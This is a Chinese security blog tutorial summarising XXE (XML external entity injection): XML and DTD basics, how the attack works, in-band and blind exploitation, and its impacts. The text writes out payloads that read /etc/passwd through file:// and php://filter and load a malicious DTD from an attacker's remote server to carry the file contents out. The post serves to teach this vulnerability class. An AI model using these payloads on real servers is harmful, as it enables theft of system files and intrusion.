---
title: web类 | XXE漏洞总结
url: https://www.secpulse.com/archives/189161.html
source: 安全脉搏
date: 2022-10-18
fetch_date: 2025-10-03T20:06:24.302784
---

# web类 | XXE漏洞总结

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# web类 | XXE漏洞总结

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[贝塔安全实验室](https://www.secpulse.com/newpage/author?author_id=9525)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-10-17

16,860

**XML外部实体注入简称XXE漏洞**：XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。

## **1. XML基础知识**

XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。

```
<?xml version=”1.0”>           //xml声明
<!DOCTYPE  note [<!ELEMENT note (to, from, heading, body)><!ELEMENT to   (#PCDATA)>                     //文档类型定义<!ELEMENT from (#PCDATA)><!ELEMENT heading (#PCDATA)><!ELEMENT body   (#PCDATA)>]>
<note><to>George</to><from>John</from>                                 //文档元素<heading>Reminder</heading><body>Don’t forget the meeting</body>
```

## **2. XXE漏洞原理**

XXE Injection （XML External Entity Injection，XML 外部实体注入攻击）攻击者可以通过 XML 的外部实体来获取服务器中本应被保护的数据。对于XXE漏洞最为关键的部分是DTD文档类型，DTD 的作用是定义 XML 文档的合法构建模块。当允许引用外部实体时，通过恶意构造，可以导致任意文件读取、执行系统命令、探测内网端口、攻击内网网站等危害。DTD 可以在 XML 文档内声明，也可以外部引用；libxml2.9.1及以后，默认不再解析外部实体。

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image2.png "image2.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image2.png)

在解析 XML 时，实体将会被替换成相应的引用内容,xml文档如下所示：

(1) 包含内部实体的 XML 文档

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image3.png "image3.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image3.png)

(2) 包含外部实体的 XML 文档

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image4.png "image4.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image4.png)

## **3. XXE漏洞利用**

(1) XML 解析器解析外部实体时支持多种协议

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image5.png "image5.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image5.png)

(2) 不同解析器可能默认对于外部实体会有不同的处理规则，有些可能不会对外部实体进行解析：

```
PHP：DOM、SimpleXML；
.NET：System.Xml.XmlDocument、System.Xml.XmlReader。
```

对于XXE通常有两种利用方式：

**1) 有回显XXE、**

攻击者通过正常的回显或报错将外部实体中的内容读取出来。file 协议读取文件：

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image6.png "image6.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image6.png)

**2) Blind XXE、**

服务器没有回显，只能使用 Blind XXE 来构建一条带外数据通道提取数据; Blind XXE 主要使用了 DTD 约束中的参数实体和内部定义实体。参数实体：一个只能在 DTD 中定义和使用的实体，一般引用时用 % 作为前缀; 内部定义实体：在一个实体中定义的一个实体，即嵌套定义：

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image7.png "image7.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image7.png)

Blind XXE 采用嵌套形式建立带外数据通道，利用参数实体将本地内容读出来后，作为外部实体中的 URL 中的参数向其指定服务器发起请求，然后在其指定服务器的日志（Apache 日志）中读出文件的内容（指定服务器即攻击者的服务器）;DTD 中使用 % 来定义的参数实体只能在外部子集中使用，或由外部文件定义参数实体，引用到 XML 文件的 DTD 来使用; 有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体，所以需要将嵌套的实体声明放在外部文件中。

## **4. XXE漏洞绕过**

**有回显的XXE漏洞利用：**

*方式一、* xml内容为：

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image9.png "image9.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image9.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189161-1665991726.png)

*方式二、*

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image10.png "image10.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image10.png)

远程vps服务器 www/html文件下建立evil.dtd文件，文件内容如下：

<!ENTITY b SYSTEM "file:///etc/passwd">

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189161-1665991727.png)

**无回显的XXE漏洞利用：**

xml内容为：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY  % file  SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
<!ENTITY  % remote  SYSTEM "http://ip/evil2.dtd" >
%remote;
%all;
%send;
]>
```

远程端vps上在www/html文件夹下放置两个文件一个为test.php文件用于接收信息，另一个为test.dtd  其中test.php代码如下：

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image11.png "image11.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image11.png)

test.dtd中代码如下：

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image12.png "image12.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image12.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189161-1665991727.jpeg)

**0x04 XML造成的危害**

*(1) 读取任意文件* xml内容为：

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image13.png "image13.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image13.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189161-1665991728.png)

*(2) 执行系统命令* 在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能执行系统命令；

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image14.png "image14.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image14.png)

*(3) 探测内网端口*

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image15.png "image15.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/10/image15.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189161-16659917281.png)

*(4) 攻击内网网站*

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content...